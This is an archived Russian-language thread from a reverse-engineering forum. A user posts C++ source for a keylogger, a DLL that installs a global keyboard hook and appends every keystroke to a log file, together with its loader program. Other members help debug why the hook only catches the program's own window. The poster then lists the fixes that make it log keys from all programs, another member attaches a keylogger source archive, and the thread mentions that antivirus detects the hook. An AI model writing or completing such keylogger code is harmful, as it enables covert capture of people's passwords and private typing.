<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
<html>
<head>
<meta http-equiv="content-type" content="text/html;charset=utf-8">
<title>проблема с глобальным хуком для кейлогера - eXeL@B</title>
<meta NAME="DESCRIPTION" CONTENT="Для некоторых нужд пишу простенький кейлогер. Столкнулся с проблемой. Пишу длл, ставлю в ней глобальный хук SetWindowsHookEx. Хук ставится, его и каспер ловит и в ольке видно, что ставится. Но он упорно не перехватывает все">
<meta NAME="KEYWORDS" CONTENT="x64_dbg windbg ollydbg ida скачать взлом отладчик ассемблер дизассемблер крэкер cracker реверсер keygen кейген кодер патч патчер крэкми лоадер брутфорсер протектор распаковщик пароль ключ ключфайл шпион oep key защита программа winapi faq hiew windasm softice winhex">
<META NAME="Document-state" CONTENT="Dynamic">
<META HTTP-EQUIV="Pragma" CONTENT="no-cache"> 
<link rel="SHORTCUT ICON" href="/favicon.ico">
<meta name="viewport" content="width=device-width">
<link href="./skin/s0.css" type="text/css" rel="STYLESHEET">
<link href="./skin/code.css" type="text/css" rel="STYLESHEET">
<script type="text/javascript" src="./js/jq.js"></script>
<link rel="alternate" type="application/rss+xml" title="eXeL@B" href="./rss.php">
<style type="text/css">.username div .dops{display:none;}</style>
<link href="../menu.css" type="text/css" rel="stylesheet">
</head>

<body>
<a id="to_top"></a>
<div id="wrapper">
 
<div class="mob-hamburger"><span></span></div>
 
</center></div><script type='text/javascript'>
function lst(){var i=0;var htm='';var a='';var timer=setInterval(function(){if(i<10){i=i+10;}else{clearInterval(timer);i=0;}document.getElementById('kurs_container').style.marginLeft='-'+i+'px';},100);}
document.addEventListener('DOMContentLoaded',function(event){setTimeout(lst,1500);setInterval(lst,10000);});
</script></div></div>
<script type="text/javascript">
jQuery(document).ready(function(){
    jQuery(".mob-hamburger").on("click", function() {
        jQuery(".mob-hamburger").toggleClass("active");
        jQuery("#site-navigation").slideToggle();
		if (jQuery('.mob-hamburger').hasClass('active')) {
			var i = jQuery('#site-navigation').offset().top;
		} else { 
			var i = 0;
		}
			
		jQuery("html, body").animate({ scrollTop: i }, 600);
    });
	var btn = jQuery('#to_top');
	jQuery(window).scroll(function() {
		if (jQuery(window).scrollTop() > 300) {
			btn.addClass('show');
		} else {
			btn.removeClass('show');
		}
	});
	btn.on('click', function(e) {
		e.preventDefault();
		jQuery('html, body').animate({scrollTop:0}, '300');
	});
});
</script>
 
<div id="content">
<div align=center style="margin-top:15px">

<table class=tbTransparent>
<tr><td class=tbTransparent>
<span class=txtSm>Сейчас на форуме: <b><a target='_blank' href='?action=userinfo&amp;user=8344'>Magister Yoda</a>, <a target='_blank' href='?action=userinfo&amp;user=50833'>vasilevradislav</a>, <a target='_blank' href='?action=userinfo&amp;user=55995'>tyns777</a>, <a target='_blank' href='?action=userinfo&amp;user=42072'>zombi-vadim</a> (+3 невидимых)</b></span>
</td>
</tr>
</table>

<table class=forums>
 
</tr></table>

</div><br>
<script language="javascript" type="text/javascript" charset="windows-1251" src="templates/base.js"></script>

<div align=center><table class=forums><tr>
<td width=16 valign=top class=caption3><img src="./img/forum_icons/p.gif" width=16 height=16 alt=""></td>
<td width="100%" class=caption3><span class=header>&nbsp;<a href="../index.html"><b>eXeL@B</b></a> <b class=bulletHead>&#8212;&#8250;</b> <a href="action=vtopic&amp;forum=6&sortBy=0&page=0.html"><b>Программирование</b></a> <b class=bulletHead>&#8212;&#8250;</b> проблема с глобальным хуком для кейлогера</span></td>
</tr></table>
<table class=tbTransparent><tr><td class=tbTransparent><span class=txtSm><b></b></span></td></tr></table>
<table class=forums><tr>
<td width="15%" class=caption4><span class=txtSm><b>Посл.ответ</b></span></td>
<td width="85%" class=caption4><span class=txtSm><b>Сообщение</b></span></td></tr>
<tr valign=top class=tbCel1>
<td width="17%" class=caption1>
<div class=username><div><b><a name="1" onfocus="this.blur()" href="JavaScript:di('[b]dimaxmaster[/b]','')">dimaxmaster</a></b><br></div>
<img src="img/s4.gif" alt=""><br><span class=txtSm>Ранг: 53.8 (постоянный)<br><span title='Сообщений в день (с регистрации) / За последний год / Лет с регистрации: 13.71'>Активность: 0.05<span style='color:red'>&searr;</span>0</span><br>Статус: <a href="action=userinfo&amp;user=7375">Участник</a></span></div>
<br>
</td>
<td width="83%" class="caption1 post"><span class=txtSm>Создано: 27 мая 2008 09:11 <br><script type="text/javascript">QU('dimaxmaster','Цитата','пишет');</script> &middot; <a href="?step=sendmsg&amp;action=pmail&amp;userto=dimaxmaster" target="_blank">Личное сообщение</a> &middot;  <a href="#1" onClick="prompt('Ссылка на сообщение', 'https://exelab.ru/f/action=vthread&amp;forum=6&amp;topic=11955.html&amp;page=0#1');return false;">#1</a> </span><div align=left><br>
Для некоторых нужд пишу простенький кейлогер. Столкнулся с проблемой. Пишу длл, ставлю в ней глобальный хук SetWindowsHookEx. Хук ставится, его и каспер ловит и в ольке видно, что ставится. Но он упорно не перехватывает все события, а только те события, которые адресованы окну самого кейлогера, в чем ошибка не пойму<br>Вот текст dll ки. Язык с++, делаю в C++Borland Builder 6<br>//-------------------------------------------------------------------- -------<br><br>#include &lt;vcl.h&gt;<br>#include &lt;windows.h&gt;<br>#include &lt;stdio.h&gt;<br>#pragma hdrstop<br><br>#pragma argsused<br>HHOOK hHook;<br>HINSTANCE hInstance;<br>_declspec(dllexport) int SetHook();<br>LRESULT CALLBACK KeyHook(int,WPARAM,LPARAM);<br><br>int WINAPI DllEntryPoint(HINSTANCE hinst, unsigned long reason, void* lpReserved)<br>{<br>  if(reason==DLL_PROCESS_ATTACH)<br>        hInstance=(HINSTANCE)hinst;<br>        return 1;<br>}<br>//-------------------------------------------------------------------- -------<br>_declspec(dllexport) int SetHook()// тут хук<br>{<br>  hHook=SetWindowsHookEx(WH_KEYBOARD,(HOOKPROC)KeyHook,hInstance,0);<br>  if(hHook==0) return -1;<br>  return 0; <br>}<br>LRESULT CALLBACK KeyHook(int code,WPARAM wParam,LPARAM lParam)// тут записть перехвата в файл<br>{<br> FILE *file=fopen(&quot;t.log&quot;,&quot;a&quot;);<br> fprintf(file,&quot;%c&quot;,wParam);<br> fclose(file);<br> return CallNextHookEx(hHook,code,wParam,lParam);<br><br>}<br><br>Вот экзешник:<br>#include &lt;windows.h&gt;<br>#include &lt;stdio.h&gt;<br>#pragma hdrstop<br>//-------------------------------------------------------------------- -------<br>#pragma argsused<br><br>HWND hMainWnd;<br>HINSTANCE hDll;<br>LRESULT CALLBACK WndProc(HWND,UINT,WPARAM,LPARAM);<br>int (*SetHook)();<br><br>int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)<br>{<br>        char szClassName[]=&quot;MyClass&quot;;<br>        MSG msg;<br>        WNDCLASSEX wc;<br><br>        wc.cbSize=sizeof(wc);<br>        wc.style=CS_HREDRAW|CS_VREDRAW;<br>        wc.lpfnWndProc=WndProc;<br>        wc.cbClsExtra=0;<br>        wc.cbWndExtra=0;<br>        wc.hInstance=hInstance;<br>        wc.hIcon=LoadIcon(NULL,IDI_APPLICATION);<br>        wc.hCursor=LoadCursor(NULL,IDC_ARROW);<br>        wc.hbrBackground=(HBRUSH)GetStockObject(WHITE_BRUSH);<br>        wc.lpszMenuName=NULL;<br>        wc.lpszClassName=szClassName;<br>        wc.hIconSm=LoadIcon(NULL,IDI_APPLICATION);<br><br>        if(!RegisterClassEx(&amp;wc))<br>        {<br>         MessageBox(NULL,&quot;Cannot register class&quot;,&quot;Error&quot;,MB_OK);<br>         return 0;<br>        }<br><br>        hMainWnd=CreateWindow(szClassName,&quot;Hello App&quot;,WS_OVERLAPPEDWINDOW,<br>                 CW_USEDEFAULT,0,CW_USEDEFAULT,0,(HWND)NULL,<br>                 (HMENU)NULL,(HINSTANCE)hInstance,NULL);<br><br>        if(!hMainWnd)<br>        {<br>         MessageBox(NULL,&quot;Cannot create main window&quot;,&quot;Error&quot;,MB_OK);<br>         return 0;<br>        }<br>        ShowWindow(hMainWnd,nCmdShow);//SW_HIDE);//<br>        hDll=LoadLibrary((LPCTSTR)&quot;udll.dll&quot;);<br>        SetHook=(int(*)())GetProcAddress(hDll,&quot;@SetHook&#036;qv&quot;);<br>        if(SetHook)SetHook();<br><br>        while(GetMessage(&amp;msg,NULL,0,0))<br>        {<br>         TranslateMessage(&amp;msg);<br>         DispatchMessage(&amp;msg);<br>        }<br>        if(hDll)FreeLibrary(hDll);<br>        return msg.wParam;<br>}<br>LRESULT CALLBACK WndProc(HWND hWnd ,UINT msg,WPARAM wParam,LPARAM lParam)<br>{<br>  switch(msg)<br>  {<br>    case WM_CLOSE:<br>        if(hDll)FreeLibrary(hDll);<br>        DestroyWindow(hWnd);<br>        break;<br>    case WM_DESTROY:<br>         if(hDll)FreeLibrary(hDll);<br>         PostQuitMessage(0);<br>         break;<br>    default:<br>        return DefWindowProc(hWnd,msg,wParam,lParam);<br>  }<br>  return 0;<br>}<br><br>Кто глянет, где ошибка и почему не пишет все события в файл, а только события от родного окна???
<br><br><span class="txtGoods"><a href="action=addthx&amp;post=190396&amp;user=7375&amp;forum_n=6&amp;topic=11955.html&amp;page=0&amp;anchor=1" class="addthx" data-post="190396"><img src="img/tu.png" border=0 title="Полезное сообщение"></a><span class="have_thx" style="display:none"> | Сообщение посчитали полезным: <span class="total_thx"></span></span></span><br></div></td>
</tr>

<tr><td class=caption4 colspan=2></td></tr>

<tr valign=top class=tbCel2>
<td width="17%" class=caption1>
<div class=username><div><b><a name="2" onfocus="this.blur()" href="JavaScript:di('[b]s0larian[/b]','')">s0larian</a></b><br></div>
<img src="img/s7.gif" alt=""><br><img style="padding-top:3px;" src="av/1737.jpg" alt=""><br><span class=txtSm>Ранг: 387.4 (мудрец)<br><span title='Сообщений в день (с регистрации) / За последний год / Лет с регистрации: 15.19'>Активность: 0.17<span style='color:red'>&searr;</span>0</span><br>Статус: <a href="action=userinfo&amp;user=1737">Участник</a><br><font color=blue>системщик</font></span></div>
<br>
</td>
<td width="83%" class="caption1 post"><span class=txtSm>Создано: 27 мая 2008 10:04 <br><script type="text/javascript">QU('s0larian','Цитата','пишет');</script> &middot; <a href="?step=sendmsg&amp;action=pmail&amp;userto=s0larian" target="_blank">Личное сообщение</a> &middot;  <a href="#2" onClick="prompt('Ссылка на сообщение', 'https://exelab.ru/f/action=vthread&amp;forum=6&amp;topic=11955.html&amp;page=0#2');return false;">#2</a> </span><div align=left><br>
Ты посылаешь в SetWindowsHookEx() не тот hinst. Перенеси SetHook() в код устанавливающего процесса и используй hinst полученный от LoadLibrary().
<br><br><span class="txtGoods"><a href="action=addthx&amp;post=190402&amp;user=1737&amp;forum_n=6&amp;topic=11955.html&amp;page=0&amp;anchor=2" class="addthx" data-post="190402"><img src="img/tu.png" border=0 title="Полезное сообщение"></a><span class="have_thx" style="display:none"> | Сообщение посчитали полезным: <span class="total_thx"></span></span></span><br></div></td>
</tr>

<tr valign=top class=tbCel1>
<td width="17%" class=caption1>
<div class=username><div><b><a name="3" onfocus="this.blur()" href="JavaScript:di('[b]LazzY[/b]','')">LazzY</a></b><br></div>
<img src="img/s5.gif" alt=""><br><span class=txtSm>Ранг: 110.7 (ветеран)<br><span title='Сообщений в день (с регистрации) / За последний год / Лет с регистрации: 14.36'>Активность: 0.07<span style='color:red'>&searr;</span>0</span><br>Статус: <a href="action=userinfo&amp;user=3961">Участник</a><br><font color=blue>~ tPORt ~</font></span></div>
<br>
</td>
<td width="83%" class="caption1 post"><span class=txtSm>Создано: 27 мая 2008 10:42 &middot; Поправил: LazzY <br><script type="text/javascript">QU('LazzY','Цитата','пишет');</script> &middot; <a href="?step=sendmsg&amp;action=pmail&amp;userto=LazzY" target="_blank">Личное сообщение</a> &middot;  <a href="#3" onClick="prompt('Ссылка на сообщение', 'https://exelab.ru/f/action=vthread&amp;forum=6&amp;topic=11955.html&amp;page=0#3');return false;">#3</a> </span><div align=left><br>
может я чего не понимаю, но откуда здесь:<br><I>dimaxmaster пишет:<br>LRESULT CALLBACK KeyHook(int code,WPARAM wParam,LPARAM lParam)// тут записть перехвата в файл <br>{ <br>FILE *file=fopen(&quot;t.log&quot;,&quot;a&quot;); <br>fprintf(file,&quot;%c&quot;,wParam); <br>fclose(file); <br>return CallNextHookEx(hHook,code,wParam,lParam); <br>} </I><br>вы возьмете hHook для остальных длл ( не тех что поставили хук ) ?<br><br><b>s0larian</b>, глобальная переменая не распространяется на все копии дллок в системе. уже не 98ой год на дворе <img src="img/smilies/s1.gif" alt="">
<br><br><span class="txtGoods"><a href="action=addthx&amp;post=190406&amp;user=3961&amp;forum_n=6&amp;topic=11955.html&amp;page=0&amp;anchor=3" class="addthx" data-post="190406"><img src="img/tu.png" border=0 title="Полезное сообщение"></a><span class="have_thx" style="display:none"> | Сообщение посчитали полезным: <span class="total_thx"></span></span></span><br></div></td>
</tr>

<tr valign=top class=tbCel2>
<td width="17%" class=caption1>
<div class=username><div><b><a name="4" onfocus="this.blur()" href="JavaScript:di('[b]s0larian[/b]','')">s0larian</a></b><br></div>
<img src="img/s7.gif" alt=""><br><img style="padding-top:3px;" src="av/1737.jpg" alt=""><br><span class=txtSm>Ранг: 387.4 (мудрец)<br><span title='Сообщений в день (с регистрации) / За последний год / Лет с регистрации: 15.19'>Активность: 0.17<span style='color:red'>&searr;</span>0</span><br>Статус: <a href="action=userinfo&amp;user=1737">Участник</a><br><font color=blue>системщик</font></span></div>
<br>
</td>
<td width="83%" class="caption1 post"><span class=txtSm>Создано: 27 мая 2008 19:41 <br><script type="text/javascript">QU('s0larian','Цитата','пишет');</script> &middot; <a href="?step=sendmsg&amp;action=pmail&amp;userto=s0larian" target="_blank">Личное сообщение</a> &middot;  <a href="#4" onClick="prompt('Ссылка на сообщение', 'https://exelab.ru/f/action=vthread&amp;forum=6&amp;topic=11955.html&amp;page=0#4');return false;">#4</a> </span><div align=left><br>
<b>LazzY</b>, это ж глобальная переменная у него.
<br><br><span class="txtGoods"><a href="action=addthx&amp;post=190437&amp;user=1737&amp;forum_n=6&amp;topic=11955.html&amp;page=0&amp;anchor=4" class="addthx" data-post="190437"><img src="img/tu.png" border=0 title="Полезное сообщение"></a><span class="have_thx" style="display:none"> | Сообщение посчитали полезным: <span class="total_thx"></span></span></span><br></div></td>
</tr>

<tr valign=top class=tbCel1>
<td width="17%" class=caption1>
<div class=username><div><b><a name="5" onfocus="this.blur()" href="JavaScript:di('[b]AlexZ[/b]','')">AlexZ</a></b><br></div>
<img src="img/s6.gif" alt=""><br><span class=txtSm>Ранг: 203.3 (наставник)<br><span title='Сообщений в день (с регистрации) / За последний год / Лет с регистрации: 15.9'>Активность: 0.22<span style='color:red'>&searr;</span>0</span><br>Статус: <a href="action=userinfo&amp;user=175">Участник</a><br><font color=blue>UPX Killer -d</font></span></div>
<br>
</td>
<td width="83%" class="caption1 post"><span class=txtSm>Создано: 27 мая 2008 22:37 <br><script type="text/javascript">QU('AlexZ','Цитата','пишет');</script> &middot; <a href="?step=sendmsg&amp;action=pmail&amp;userto=AlexZ" target="_blank">Личное сообщение</a> &middot;  <a href="#5" onClick="prompt('Ссылка на сообщение', 'https://exelab.ru/f/action=vthread&amp;forum=6&amp;topic=11955.html&amp;page=0#5');return false;">#5</a> </span><div align=left><br>
<b>dimaxmaster</b>, возьмите хороший работающий пример для сравнительного анализа.
<br><br><font size="1"><i>-----<br>Я медленно снимаю с неё UPX... *FF_User*</i></font><br><br><span class="txtGoods"><a href="action=addthx&amp;post=190449&amp;user=175&amp;forum_n=6&amp;topic=11955.html&amp;page=0&amp;anchor=5" class="addthx" data-post="190449"><img src="img/tu.png" border=0 title="Полезное сообщение"></a><span class="have_thx" style="display:none"> | Сообщение посчитали полезным: <span class="total_thx"></span></span></span><br></div></td>
</tr>

<tr valign=top class=tbCel2>
<td width="17%" class=caption1>
<div class=username><div><b><a name="6" onfocus="this.blur()" href="JavaScript:di('[b]s0larian[/b]','')">s0larian</a></b><br></div>
<img src="img/s7.gif" alt=""><br><img style="padding-top:3px;" src="av/1737.jpg" alt=""><br><span class=txtSm>Ранг: 387.4 (мудрец)<br><span title='Сообщений в день (с регистрации) / За последний год / Лет с регистрации: 15.19'>Активность: 0.17<span style='color:red'>&searr;</span>0</span><br>Статус: <a href="action=userinfo&amp;user=1737">Участник</a><br><font color=blue>системщик</font></span></div>
<br>
</td>
<td width="83%" class="caption1 post"><span class=txtSm>Создано: 28 мая 2008 00:21 <br><script type="text/javascript">QU('s0larian','Цитата','пишет');</script> &middot; <a href="?step=sendmsg&amp;action=pmail&amp;userto=s0larian" target="_blank">Личное сообщение</a> &middot;  <a href="#6" onClick="prompt('Ссылка на сообщение', 'https://exelab.ru/f/action=vthread&amp;forum=6&amp;topic=11955.html&amp;page=0#6');return false;">#6</a> </span><div align=left><br>
<b>LazzY</b>, согласен, эта глобальная переменная установленная в одном процессе не имеет эффекта в другом, но косяк не тут - msdn говорит что этот параметр игнорируется. IMHO косяк с hinst
<br><br><span class="txtGoods"><a href="action=addthx&amp;post=190455&amp;user=1737&amp;forum_n=6&amp;topic=11955.html&amp;page=0&amp;anchor=6" class="addthx" data-post="190455"><img src="img/tu.png" border=0 title="Полезное сообщение"></a><span class="have_thx" style="display:none"> | Сообщение посчитали полезным: <span class="total_thx"></span></span></span><br></div></td>
</tr>

<tr valign=top class=tbCel1>
<td width="17%" class=caption1>
<div class=username><div><b><a name="7" onfocus="this.blur()" href="JavaScript:di('[b]dimaxmaster[/b]','')">dimaxmaster</a></b><br></div>
<img src="img/s4.gif" alt=""><br><span class=txtSm>Ранг: 53.8 (постоянный)<br><span title='Сообщений в день (с регистрации) / За последний год / Лет с регистрации: 13.71'>Активность: 0.05<span style='color:red'>&searr;</span>0</span><br>Статус: <a href="action=userinfo&amp;user=7375">Участник</a></span></div>
<br>
</td>
<td width="83%" class="caption1 post"><span class=txtSm>Создано: 28 мая 2008 09:04 <br><script type="text/javascript">QU('dimaxmaster','Цитата','пишет');</script> &middot; <a href="?step=sendmsg&amp;action=pmail&amp;userto=dimaxmaster" target="_blank">Личное сообщение</a> &middot;  <a href="#7" onClick="prompt('Ссылка на сообщение', 'https://exelab.ru/f/action=vthread&amp;forum=6&amp;topic=11955.html&amp;page=0#7');return false;">#7</a> </span><div align=left><br>
<I>s0larian пишет:<br>Ты посылаешь в SetWindowsHookEx() не тот hinst. Перенеси SetHook() в код устанавливающего процесса и используй hinst полученный от LoadLibrary(). </I><br><br>Я могу перенести SetHook() в экзешник, но где тогда размещять SetWindowsHookEx(), ведь он находится именно в dll в функции  SetHook()?<br><br><b>LazzY</b> Возврат hHook в функции return CallNextHookEx(hHook,code,wParam,lParam) обязателен по MSDN - иначе нужная программа не получит свое сообщение. <br><br><I>s0larian пишет:<br>LazzY, согласен, эта глобальная переменная установленная в одном процессе не имеет эффекта в другом, но косяк не тут - msdn говорит что этот параметр игнорируется. IMHO косяк с hinst </I><br><br>Может и косяк с hinst, но какой? Я ведь передаю глобальному хуку hinst который возращает dll при аттаче к процессу. <br>Пока думаю в чем ошибка
<br><br><span class="txtGoods"><a href="action=addthx&amp;post=190465&amp;user=7375&amp;forum_n=6&amp;topic=11955.html&amp;page=0&amp;anchor=7" class="addthx" data-post="190465"><img src="img/tu.png" border=0 title="Полезное сообщение"></a><span class="have_thx" style="display:none"> | Сообщение посчитали полезным: <span class="total_thx"></span></span></span><br></div></td>
</tr>

<tr valign=top class=tbCel2>
<td width="17%" class=caption1>
<div class=username><div><b><a name="8" onfocus="this.blur()" href="JavaScript:di('[b]Stack[/b]','')">Stack</a></b><br></div>
<img src="img/s5.gif" alt=""><br><span class=txtSm>Ранг: 107.5 (ветеран)<br><span title='Сообщений в день (с регистрации) / За последний год / Лет с регистрации: 12.68'>Активность: 0.15<span style='color:red'>&searr;</span>0</span><br>Статус: <a href="action=userinfo&amp;user=13953">Участник</a></span></div>
<br>
</td>
<td width="83%" class="caption1 post"><span class=txtSm>Создано: 28 мая 2008 11:24 <br><script type="text/javascript">QU('Stack','Цитата','пишет');</script> &middot; <a href="?step=sendmsg&amp;action=pmail&amp;userto=Stack" target="_blank">Личное сообщение</a> &middot;  <a href="#8" onClick="prompt('Ссылка на сообщение', 'https://exelab.ru/f/action=vthread&amp;forum=6&amp;topic=11955.html&amp;page=0#8');return false;">#8</a> </span><div align=left><br>
Я видил исходник кейлогера на delphi так там из основного модуля функции установки хука передавался hinst. И в интернете много инфы на эту тему которая мне лично помогала.<br><br><i class=x>hMod<br>Идентифицирует динамически подключаемую библиотеку (DLL), содержащую фильтр - процедуру, указанную lpfn параметром. Параметр hMod должен быть установлен в значение ПУСТО (NULL), если параметр dwThreadId определяет поток, созданный текущим процессом и, если подключаемая процедура внутри кода, связанного с текущим процессом.</i><br><br>Ну и вот вся статья - www.firststeps.ru/mfc/winapi/hook/r.php?35
<br><br><font size="1"><i>-----<br>Md5 fcbb6c9c9a5029b24d70f2d67c7cca74</i></font><br><br><span class="txtGoods"><a href="action=addthx&amp;post=190470&amp;user=13953&amp;forum_n=6&amp;topic=11955.html&amp;page=0&amp;anchor=8" class="addthx" data-post="190470"><img src="img/tu.png" border=0 title="Полезное сообщение"></a><span class="have_thx" style="display:none"> | Сообщение посчитали полезным: <span class="total_thx"></span></span></span><br></div></td>
</tr>

<tr valign=top class=tbCel1>
<td width="17%" class=caption1>
<div class=username><div><b><a name="9" onfocus="this.blur()" href="JavaScript:di('[b]Leatherfase[/b]','')">Leatherfase</a></b><br></div>
<img src="img/s3.gif" alt=""><br><span class=txtSm>Ранг: 33.7 (посетитель)<br><span title='Сообщений в день (с регистрации) / За последний год / Лет с регистрации: 12.68'>Активность: 0.03<span style='color:red'>&searr;</span>0</span><br>Статус: <a href="action=userinfo&amp;user=13943">Участник</a></span></div>
<br>
</td>
<td width="83%" class="caption1 post"><span class=txtSm>Создано: 28 мая 2008 11:40 <br><script type="text/javascript">QU('Leatherfase','Цитата','пишет');</script> &middot; <a href="?step=sendmsg&amp;action=pmail&amp;userto=Leatherfase" target="_blank">Личное сообщение</a> &middot;  <a href="#9" onClick="prompt('Ссылка на сообщение', 'https://exelab.ru/f/action=vthread&amp;forum=6&amp;topic=11955.html&amp;page=0#9');return false;">#9</a> </span><div align=left><br>
Вот сам исходник кейлоггера,глянь,мож полезного чего<br>в нем найдёш<img src="img/smilies/s6.gif" alt=""><br><br><img src="img/attach.gif" alt=""> <a href="./files/b319_28.05.2008_CRACKLAB.rU.tgz">b319_28.05.2008_CRACKLAB.rU.tgz</a> - Key_Logger.7z
<br><br><span class="txtGoods"><a href="action=addthx&amp;post=190473&amp;user=13943&amp;forum_n=6&amp;topic=11955.html&amp;page=0&amp;anchor=9" class="addthx" data-post="190473"><img src="img/tu.png" border=0 title="Полезное сообщение"></a><span class="have_thx" style="display:none"> | Сообщение посчитали полезным: <span class="total_thx"></span></span></span><br></div></td>
</tr>

<tr valign=top class=tbCel2>
<td width="17%" class=caption1>
<div class=username><div><b><a name="10" onfocus="this.blur()" href="JavaScript:di('[b]s0larian[/b]','')">s0larian</a></b><br></div>
<img src="img/s7.gif" alt=""><br><img style="padding-top:3px;" src="av/1737.jpg" alt=""><br><span class=txtSm>Ранг: 387.4 (мудрец)<br><span title='Сообщений в день (с регистрации) / За последний год / Лет с регистрации: 15.19'>Активность: 0.17<span style='color:red'>&searr;</span>0</span><br>Статус: <a href="action=userinfo&amp;user=1737">Участник</a><br><font color=blue>системщик</font></span></div>
<br>
</td>
<td width="83%" class="caption1 post"><span class=txtSm>Создано: 28 мая 2008 20:03 <br><script type="text/javascript">QU('s0larian','Цитата','пишет');</script> &middot; <a href="?step=sendmsg&amp;action=pmail&amp;userto=s0larian" target="_blank">Личное сообщение</a> &middot;  <a href="#10" onClick="prompt('Ссылка на сообщение', 'https://exelab.ru/f/action=vthread&amp;forum=6&amp;topic=11955.html&amp;page=0#10');return false;">#10</a> </span><div align=left><br>
<I>dimaxmaster пишет:<br>Я могу перенести SetHook() в экзешник, но где тогда размещять SetWindowsHookEx(), ведь он находится именно в dll в функции SetHook()?  </I><br>В .exe<br><br><I>dimaxmaster пишет:<br>Может и косяк с hinst, но какой? </I><br>Я ж тебе отписал уже: &quot;используй hinst полученный от LoadLibrary()&quot;
<br><br><span class="txtGoods"><a href="action=addthx&amp;post=190529&amp;user=1737&amp;forum_n=6&amp;topic=11955.html&amp;page=0&amp;anchor=10" class="addthx" data-post="190529"><img src="img/tu.png" border=0 title="Полезное сообщение"></a><span class="have_thx" style="display:none"> | Сообщение посчитали полезным: <span class="total_thx"></span></span></span><br></div></td>
</tr>

<tr valign=top class=tbCel1>
<td width="17%" class=caption1>
<div class=username><div><b><a name="11" onfocus="this.blur()" href="JavaScript:di('[b]dimaxmaster[/b]','')">dimaxmaster</a></b><br></div>
<img src="img/s4.gif" alt=""><br><span class=txtSm>Ранг: 53.8 (постоянный)<br><span title='Сообщений в день (с регистрации) / За последний год / Лет с регистрации: 13.71'>Активность: 0.05<span style='color:red'>&searr;</span>0</span><br>Статус: <a href="action=userinfo&amp;user=7375">Участник</a></span></div>
<br>
</td>
<td width="83%" class="caption1 post"><span class=txtSm>Создано: 29 мая 2008 16:59 <br><script type="text/javascript">QU('dimaxmaster','Цитата','пишет');</script> &middot; <a href="?step=sendmsg&amp;action=pmail&amp;userto=dimaxmaster" target="_blank">Личное сообщение</a> &middot;  <a href="#11" onClick="prompt('Ссылка на сообщение', 'https://exelab.ru/f/action=vthread&amp;forum=6&amp;topic=11955.html&amp;page=0#11');return false;">#11</a> </span><div align=left><br>
Нашел ошибку, собственно. Кому интересно, то такие изменения:<br><br>1. В dll процедуру SetHOOK()  поменял с int на void. Убрал возвращаемое значение.<br>2. В dll Переменную HINSTANCE hInstanse поменял на HANDLE hInstance<br>3. Файл записи указал конкретно, было &quot;t.log&quot; стало &quot;E://t.log&quot; (можно любое другое место)<br><br>После этого все пишется в файл из любых программ и форм.Сразу добавлю, это только макет. Для корректной работы необходимо переписать процедуры записи в файл, так как при таком коде пишет с кракозябрами. Такой код каспер ловит сразу, на других антивирях не проверял. Собственно каспер видит вызов SetWindowsHookEx и сразу &quot;кричит&quot;.<br><br><I>s0larian пишет:<br>dimaxmaster пишет:<br>Я могу перенести SetHook() в экзешник, но где тогда размещять SetWindowsHookEx(), ведь он находится именно в dll в функции SetHook()?<br>В .exe </I><br>В exe нельзя переносить, толку не будет. Из exe катит только на 95,98 и Ме Виндосах. 2000, XP и все из этой серии, то хук ставится только в dll
<br><br><span class="txtGoods"><a href="action=addthx&amp;post=190611&amp;user=7375&amp;forum_n=6&amp;topic=11955.html&amp;page=0&amp;anchor=11" class="addthx" data-post="190611"><img src="img/tu.png" border=0 title="Полезное сообщение"></a><span class="have_thx" style="display:none"> | Сообщение посчитали полезным: <span class="total_thx"></span></span></span><br></div></td>
</tr>

<tr valign=top class=tbCel2>
<td width="17%" class=caption1>
<div class=username><div><b><a name="12" onfocus="this.blur()" href="JavaScript:di('[b]Hellspawn[/b]','')">Hellspawn</a></b><br></div>
<img src="img/s8.gif" alt=""><br><img style="padding-top:3px;" src="av/72.gif" alt=""><br><span class=txtSm>Ранг: 990.2 <font color=red>(<b>! ! !</b>)</font>, 380thx<br><span title='Сообщений в день (с регистрации) / За последний год / Лет с регистрации: 15.95'>Активность: 0.68<span style='color:red'>&searr;</span>0</span><br>Статус: <a href="action=userinfo&amp;user=72">Модератор</a><br><font color=blue>Author of DiE</font></span></div>
<br>
</td>
<td width="83%" class="caption1 post"><span class=txtSm>Создано: 29 мая 2008 17:29 &middot; Поправил: Hellspawn <br><script type="text/javascript">QU('Hellspawn','Цитата','пишет');</script> &middot; <a href="?step=sendmsg&amp;action=pmail&amp;userto=Hellspawn" target="_blank">Личное сообщение</a> &middot;  <a href="#12" onClick="prompt('Ссылка на сообщение', 'https://exelab.ru/f/action=vthread&amp;forum=6&amp;topic=11955.html&amp;page=0#12');return false;">#12</a> </span><div align=left><br>
<I>dimaxmaster пишет:<br>В exe нельзя переносить, толку не будет. Из exe катит только на 95,98 и Ме Виндосах. 2000, XP и все из этой серии, то хук ставится только в dll </I><br><br>кто вам такое сказал?? гугл -&gt; WH_KEYBOARD_LL и WH_MOUSE_LL
<br><br><font size="1"><i>-----<br>[nice coder and reverser]</i></font><br><br><span class="txtGoods"><a href="action=addthx&amp;post=190617&amp;user=72&amp;forum_n=6&amp;topic=11955.html&amp;page=0&amp;anchor=12" class="addthx" data-post="190617"><img src="img/tu.png" border=0 title="Полезное сообщение"></a><span class="have_thx" style="display:none"> | Сообщение посчитали полезным: <span class="total_thx"></span></span></span><br></div></td>
</tr>

<tr valign=top class=tbCel1>
<td width="17%" class=caption1>
<div class=username><div><b><a name="13" onfocus="this.blur()" href="JavaScript:di('[b]s0larian[/b]','')">s0larian</a></b><br></div>
<img src="img/s7.gif" alt=""><br><img style="padding-top:3px;" src="av/1737.jpg" alt=""><br><span class=txtSm>Ранг: 387.4 (мудрец)<br><span title='Сообщений в день (с регистрации) / За последний год / Лет с регистрации: 15.19'>Активность: 0.17<span style='color:red'>&searr;</span>0</span><br>Статус: <a href="action=userinfo&amp;user=1737">Участник</a><br><font color=blue>системщик</font></span></div>
<br>
</td>
<td width="83%" class="caption1 post"><span class=txtSm>Создано: 30 мая 2008 00:23 <br><script type="text/javascript">QU('s0larian','Цитата','пишет');</script> &middot; <a href="?step=sendmsg&amp;action=pmail&amp;userto=s0larian" target="_blank">Личное сообщение</a> &middot;  <a href="#13" onClick="prompt('Ссылка на сообщение', 'https://exelab.ru/f/action=vthread&amp;forum=6&amp;topic=11955.html&amp;page=0#13');return false;">#13</a> </span><div align=left><br>
